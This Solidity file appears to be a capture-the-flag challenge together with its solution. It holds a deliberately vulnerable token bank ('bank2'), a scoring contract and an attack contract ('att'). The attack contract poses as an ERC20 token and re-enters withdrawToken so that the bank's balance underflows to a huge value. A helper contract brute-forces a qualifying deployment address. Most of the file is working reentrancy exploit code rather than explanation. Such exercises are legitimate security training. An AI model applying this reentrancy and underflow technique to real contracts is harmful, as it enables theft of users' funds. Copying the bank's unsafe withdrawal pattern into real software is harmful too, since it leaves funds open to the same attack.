//SPDX-License-Identifier:UNLICENSE
// 1.token余额大于10 ether。2.token余额大于999999999999999999 ether。
pragma solidity ^0.7.0;
interface IERC20like{
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address sender, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed sender, address indexed spender, uint256 value);
}
contract ERC20 is IERC20 {

    string public constant name = "ERC20";
    string public constant symbol = "ERC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;

    uint256 totalSupply_ = 10 ether;


   constructor() {
    balances[msg.sender] = totalSupply_;
    }
    function totalSupply() public override view returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address account) public override view returns (uint256) {
        return balances[account];
    }

    function transfer(address receiver, uint256 amount) public override returns (bool) {
        require(amount <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender]-amount;
        balances[receiver] = balances[receiver]+amount;
        emit Transfer(msg.sender, receiver, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function allowance(address sender, address spender) public override view returns (uint) {
        return allowed[sender][spender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        require(amount <= balances[sender]);
        
        require(amount <= allowed[sender][msg.sender]);

        balances[sender] = balances[sender]-amount;
        allowed[sender][msg.sender] = allowed[sender][msg.sender]-amount;
        balances[recipient] = balances[recipient]+amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
}
contract bank2{
    mapping(address => mapping(address => uint256))internal accounts;
    ERC20 public token;
    constructor(){
        token = new ERC20();
    }
    function getOneToken()public{
        if(uint160(msg.sender)%44==0){
            token.transfer(msg.sender,10 ether);
            accounts[msg.sender][address(token)]=10 ether;
        }
    }
    function depositToken(address _token,uint256 amount)public{
        require(amount==0.01 ether);
        mapping(address => uint256) storage account = accounts[msg.sender];
        uint256 balanceBefore = IERC20like(_token).balanceOf(address(this));

        require(IERC20like(_token).transferFrom(msg.sender,address(this),amount),"transferFrom failed");

        uint256 balanceAfter = IERC20like(_token).balanceOf(address(this));
        require(balanceAfter - balanceBefore==amount,"deposit failed");

        account[_token]+=amount;
    }

    function withdrawToken(address _token,uint256 amount)public{
        uint256 balance = accounts[msg.sender][_token];
        require(amount<=balance);

        IERC20like(_token).transfer(msg.sender,amount);
        accounts[msg.sender][_token]-=amount;
    }

    
}
contract att is IERC20{
    check public che;
    ERC20 public token;
    uint256 isreen = 1;
    string public constant name = "ERC20";
    string public constant symbol = "ERC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) balances;

    mapping(address => mapping (address => uint256)) allowed;

    uint256 totalSupply_ = 20 ether;
    constructor(address addr) public {
        che = check(addr);
        token = che.token();
        balances[msg.sender] = 10 ether;
        balances[address(this)] = 10 ether;
    }
    function attract() public {
        this.approve(address(che), 100 ether);
        che.getOneToken();
        che.depositToken(address(this),0.01 ether);
        che.withdrawToken(address(this),0.01 ether);
        che.isCompleted(address(this));
    }
    function attract1() public {
        this.approve(address(che), 10 ether);
        che.getOneToken();
    }
    function attract2() public {
        che.depositToken(address(this),0.01 ether);
    }
    function attract3() public {
        che.withdrawToken(address(this),0.01 ether);
    }
    function attract4() public {
        che.isCompleted(address(this));
    }
    function totalSupply() external override  view returns (uint256){
        return totalSupply_;
    }
    function balanceOf(address account) external override  view returns (uint256){
        return balances[account];
    }
    function allowance(address sender, address spender) public override view returns (uint) {
        return allowed[sender][spender];
    }

    function transfer(address recipient, uint256 amount) external override  returns (bool){
        if(isreen == 1){
            isreen += 1;
            che.withdrawToken(address(this),amount);
            
        }
        return true;

    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        allowed[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) external override  returns (bool){
        // require(amount <= balances[sender]);
        
        // require(amount <= allowed[sender][msg.sender]);

        balances[sender] = balances[sender]-amount;
        allowed[sender][msg.sender] = allowed[sender][msg.sender]-amount;
        balances[recipient] = balances[recipient]+amount;
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
}
contract deploy{
    att public attracter;
    function getaddress(address addr) public {
        for (uint i = 1;i>0;i++){
            attracter = new att(addr);
            if (uint160(address(attracter))%44 == 0){
                break;
            }
        }
    }
}
contract check is bank2{
    uint256 public score;
    function isCompleted(address _token)public{
        score =0;
        if(accounts[msg.sender][address(token)]>=10 ether){
            score+=25;
        }
        if(accounts[msg.sender][_token]>999999999999999999 ether){
            score+=75;
        }
        

    }
}